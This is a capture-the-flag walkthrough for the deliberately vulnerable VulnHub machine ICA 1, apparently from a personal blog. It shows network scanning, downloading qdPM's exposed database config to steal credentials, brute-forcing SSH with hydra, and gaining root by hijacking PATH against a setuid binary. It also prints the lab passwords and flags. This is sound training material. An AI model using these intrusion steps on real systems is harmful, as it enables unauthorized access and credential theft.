---
layout: post
title: "ICA 1 Vunlhub Walkthrough"
categories: VulnHub
permalink: /ica-1-vulnhub-walkthrough
published: true
---

![banner](/assets/pictures/ICA1.jpg)

## Reconnaissance

As usual, I initially find the machine IP using `netdiscover`

> sudo netdiscover -i eth0 -r 10.0.2.0/24

![netdiscover](/assets/pictures/satu.png)

The next step is to scan the network. I scanned all possible open ports using aggressive mode. There are four open ports which represent four services, including ssh, apache, mysql, and mysqlx.

> sudo nmap -sC -sV -A -p- -oN nmap.txt --vv

```
Nmap scan report for 10.0.2.9
Host is up, received arp-response (0.00049s latency).
Scanned at 2022-08-25 06:21:56 EDT for 17s
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 0e:77:d9:cb:f8:05:41:b9:e4:45:71:c1:01:ac:da:93 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCXOd91pBvAeK0CKaRrhpY2TcbujCX4hxoP5/K/fZWGV6qn6HeOopROacEm9L9nHkGfhZyk5v9mA4FWBtPMjHUAfms8tgqDJ/IY4kQU5bnQH+gMpVA1ReJ7myaWzJTKeczWn20wzBW0Zl557PYA5ypNTOw66qgDU6vFxiQoVlbT8/kNRjvhvNuP33i1nhZhSsEZdiIznDfQlPp0ekkmqyNkhwsshFtwsYfSQOW2cpopcpvNGIG38s5FzJGrV3EYFLw4J3C5NhfSSueVhkV+LXCTmJecyxd7S/fsRimPSCR8O0z0aykN/Ts4Qmkrd2mAt8yOtLJ6pFlhTorWsAK7TXCG8xqGseE9LQdUeAk3UTrv3YPak/bdxnxH23pQy9PcNSW2bRKNpg2mKbYuQmpNyjwVaxKs2Jd3rwJwaQ0XT1wVPpi7AtLizDyrtCUpbrR/gFMUITxi0inZG54aNgS668y4ww9R98Rc1WzrwT2z6vzcev2KedzX0KkWJCp3Kdm9+jU=
|   256 40:51:93:4b:f8:37:85:fd:a5:f4:d7:27:41:6c:a0:a5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDdiFCHPlrpsgHUZ7TPuOfAk26vdS+LYia6jy6/b+3VF/PiWWxkpvaTyDIKOurj1sLje6IZLi+RCtpIzv5mI4uc=
|   256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0:cd:7b:8e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBJsiS3lTHIiHHiGGKretXMXZaFGQEkCOJMEYF2CgP0E
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.48 ((Debian))
|_http-title: qdPM | Login
|_http-favicon: Unknown favicon MD5: B0BD48E57FD398C5DA8AE8F2CCC8D90D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.48 (Debian)
3306/tcp  open  mysql   syn-ack ttl 64 MySQL 8.0.26
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26
|   Thread ID: 40
|   Capabilities flags: 65535
|   Some Capabilities: FoundRows, Support41Auth, ODBCClient, InteractiveClient, Speaks41ProtocolOld, IgnoreSigpipes, Speaks41ProtocolNew, SupportsCompression, SwitchToSSLAfterHandshake, DontAllowDatabaseTableColumn, LongColumnFlag, LongPassword, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x03a\x0De6bU\x17%\x16@\x17a%zE)P_4
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_8.0.26_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-09-25T10:47:29
| Not valid after:  2031-09-23T10:47:29
| MD5:   5b43 7361 8d5b 1938 656d 44a3 4e07 bbcc
| SHA-1: 5d26 f9ad 743c f316 6aa5 32ae fdf8 2571 bb44 91c3
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfOC4wLjI2X0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIxMDkyNTEwNDcyOVoXDTMxMDkyMzEwNDcyOVowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzguMC4yNl9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDfWVEZUH4Hy0rmiWIpyu3F
| DzQeZoC9ut3bQrW0Rza7vLLUB2xYaB28LiPu/V0iB6k7CPbjSDWLO/2cG9/QtdqH
| rlU8lTGiV6S2y3+5hwy2CKNXIKd9oovqMzYkQ/1KXsYb0tIZ5SLJwGmnXu2oMGt3
| dOMtphjUA51XoZPeNZoCLUhh1AoKrBM5DESg4og8WUczdTfk37ttmkfkuG7xiasu
| FDGC4IU8PXUuZq3l7f821AxghbsOtjX937AxVtWs2CHDHL8M8GpTuJ8DRBDitPhA
| +w9GBmXdwbV9z8MfOfu9KQSmRqBQ/QFXY1iepKi4c/4aAkZ6ZpuqmAO6ve0R0Dbn
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBADsBSpmN
| RGDthb5gpyatp6VzBp7fK6r+n9oxBTyNMYv2cic2wyt/l34poAZ8Sh1q38hb8UC8
| 44cdYZJ3hvqygIx1GT9OeVj3ZLsKMjUePq9ZYjChOpP5VHaymS3oA5d/B790k5xJ
| U3U8JlUmHwct4CMlWTKeKniFkHBwyimSn5W1O0XamWXsWG0qCTRK+0OTu3Er51V4
| nDM9lqNlTQU0MIrDvLK2kbwR1FLewc1SLvOSbjY45NNACmnUtxD0OBoYnJWHLJPP
| PKPYucw6ZEttW+bYddpgTHZAHK9JICN64uAfZZ3OXk4n666A6DBJPD/RJUOtrSOA
| hYSGLjhxppsFzSc=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
33060/tcp open  mysqlx? syn-ack ttl 64
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.92%I=7%D=8/25%Time=63074D4C%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
SF:x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\
SF:x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20me
SF:ssage\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LAN
SF:Desk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRP
SF:C,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x
SF:0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid
SF:\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10
SF:\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
MAC Address: 08:00:27:DF:E0:99 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/25%OT=22%CT=1%CU=39222%PV=Y%DS=1%DC=D%G=Y%M=080027%T
OS:M=63074D55%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6
OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Uptime guess: 23.335 days (since Mon Aug  1 22:20:29 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms 10.0.2.9
```
---

## Scanning

Based on the nmap result, the target is using qdpm CMS. I've tried everything to login, including brute force and sql injection.

![qdpm-login-panel](/assets/pictures/qdpm.png)

Somehow, I found a qdpm 9.2 exploit which is sensitive data exposure where it is publicly available on the [exploitDB.](https://www.exploit-db.com/exploits/50176)

![qdpm-pass-exposure](/assets/pictures/qdpmexploit.png)

The exploit allows attackers to steal database credentials. We can directly access this particular file at http://website/core/config/databases.yml to download it. This yml file contains the username and password for the database.

```
all:
  doctrine:
    class: sfDoctrineDatabase
    param:
      dsn: 'mysql:dbname=qdpm;host=localhost'
      profiler: false
      username: qdpmadmin
      password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
      attributes:
        quote_identifier: true 
```

I used the credentials to access the mysql server and discovered yet another juicy piece of information;) There are a few usernames and base64 encoded passwords in the staff database. I use them all to generate a wordlist containing passwords and usernames.

![staff-credentials](/assets/pictures/mysql.png)

---

## Gaining access

As I've generated a wordlist, I tried to brute force the ssh using `hydra` and found 2 valid logins.

> hydra -L users.txt -P pass.txt -t4 ssh://10.0.2.9

```
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-25 07:30:34
[DATA] max 4 tasks per 1 server, overall 4 tasks, 30 login tries (l:5/p:6), ~8 tries per task
[DATA] attacking ssh://10.0.2.9:22/
[22][ssh] host: 10.0.2.9   login: travis   password: DJceVy98W28Y7wLg
[22][ssh] host: 10.0.2.9   login: dexter   password: 7ZwV4qtg42cmUXGX
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-25 07:30:51
```

Login as Travis and we got the first flag!

```
travis@debian:~$ cat user.txt 
ICA{Secret_Project}
```

The next step ahead, I logged in as Dexter and found a note. "It seems to me that there is a weakness while accessing the system. As far as I know, the contents of executable files are partially viewable.
I need to find out if there is a vulnerability or not." 

It said there was a binary that was vulnerable. I was wondering if it was a setuid binary. Without thinking much, I tried to find this binary and found a setuid binary called `get_access`.

```
dexter@debian:/home/dexter$ find / -perm -u+s 2>/dev/null
/opt/get_access
```

---

## Post-exploitation

Apparently, this binary functions as a file reader. It reads the /root/system.info file when it gets executed.

```
dexter@debian:/opt$ strings get_access 
/lib64/ld-linux-x86-64.so.2
setuid
cat /root/system.info
```
![get_access](/assets/pictures/get_access.png)

So I planned to fool this binary by changing the behaviour of `cat`. I created a bash file named cat that contains `/bin/bash` in the `/tmp` directory and changed the path environment.

```
dexter@debian:/opt$ echo '/bin/bash' > /tmp/cat
dexter@debian:/opt$ chmod +x /tmp/cat
dexter@debian:/opt$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
dexter@debian:/opt$ export PATH=/tmp:$PATH
dexter@debian:/opt$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Execute this binary and I got root!

![root](/assets/pictures/get-access-root.png)

```
root@debian:/root# /usr/bin/cat root.txt 
ICA{Next_Generation_Self_Renewable_Genetics}
```

---

Huge thanks to @turali_onur for creating this magnificent box! 